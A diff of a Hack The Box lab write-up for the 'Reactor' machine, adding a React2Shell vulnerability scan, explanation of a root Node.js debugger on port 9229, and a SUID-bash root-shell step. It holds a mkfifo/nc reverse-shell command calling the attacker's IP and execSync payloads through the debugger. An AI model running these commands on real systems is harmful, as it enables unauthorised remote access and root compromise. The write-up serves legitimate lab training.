@@ -2,7 +2,7 @@
 title: Reactor [HTB]
 updated: 2026-10-04
 published: 2026-10-04
-description: Reactor is an easy rated Linux machine...
+description: Reactor is an Easy rated Linux Machine...
 tags:
   - reactor
 draft: false
@@ -98,8 +98,47 @@ I was looking at the UI of this site (which is cool), my gaze fallen onto the **
 
 ## Exploit **→** Shell
 
-I was ready with my listener, then tried to get reverse shell with `Bash`, `nc` , `sh` which were failed (I don't have any reason), but the **mkfifo** never disappointed me.
+I was ready with my listener, then tried to get reverse shell with `Bash`, `nc` , `sh` which were failed, but the **mkfifo** never disappointed me.
 
+### Test the code execution
+
+### Test Vulneability
+
+```
+0xz1nn ✦ ~/Documents/htb/reactor/React2Shell-PoC
+❯ python3 scanner.py -u http://10.129.54.203 -p 3000
+
+brought to you by assetnote
+
+[*] Loaded 1 host(s) to scan
+[*] Using 10 thread(s)
+[*] Timeout: 10s
+[*] Using RCE PoC check
+[!] SSL verification disabled
+
+[VULNERABLE] http://10.129.54.203:3000 - Status: 303
+
+============================================================
+SCAN SUMMARY
+============================================================
+  Total hosts scanned: 1
+  Vulnerable: 1
+  Not vulnerable: 0
+  Errors: 0
+============================================================
+[+] Vulnerable hosts written to: vulnerable.txt
+
+0xz1nn ✦ ~/Documents/htb/reactor/React2Shell-PoC
+❯ ls
+main.py  README.md  request.txt  scanner.py  vulnerable.txt
+
+0xz1nn ✦ ~/Documents/htb/reactor/React2Shell-PoC
+❯ cat vulnerable.txt
+10.129.54.203
+
+```
+
+The above commands proven the target is vulnerable. Execute the Reverse Shell command
 ```zsh wrap=false
 0xz1nn ✦ ~/Documents/htb/reactor/React2Shell-PoC
 ❯ python3 main.py http://10.129.54.203:3000 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.14.214 443 >/tmp/f'
@@ -189,7 +228,7 @@ But did you notice this part?
 /usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
 ```
 
-the  `--inspect` flag for a node process is used to activate the debugger, and here only `127.0.0.1:9229` is given access to manage the process running by `worker.js`.
+The `--inspect` flag for a node process is used to activate the debugger, which doesn't restrict who can connect to it. Though it is not exposed to the public, but any local user who access to the `127.0.0.1:9229` on the target machine can abuse the root process to elevate privileges.
 
 # Root & User flags (unintended)
 
@@ -233,7 +272,7 @@ debug>
 
 ### Command Execution
 
-The below command can be used to legitimately execute code into the process
+The below command can be used to validate the code by the debugger running as root, which leads to arbitrary code execution.
 
 ```zsh wrap=false
 exec('global.process.mainModule.require("child_process").execSync("<your sauce goes here>").toString()')
@@ -250,3 +289,19 @@ exec('global.process.mainModule.require("child_process").execSync("cat /home/eng
 '863d****8ad6****0b69****4a00****\n'
 debug>
 ```
+
+# Root Shell
+
+It's easy to get **root shell** when you have code execution with root privileges with the below technique.
+
+```
+cp /bin/bash /tmp/rootshell; chmod +s /tmp/rootshell
+```
+
+which makes a copy of the `/bin/bash` binary sets SUID bit as root (which grants the root permissions to the binary) into `/tmp` directory, which is accessed by any user on the machine.
+
+The full command to spawn a root shell.
+
+  ```
+  exec('global.process.mainModule.require("child_process").execSync("cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash").toString()')
+  ```
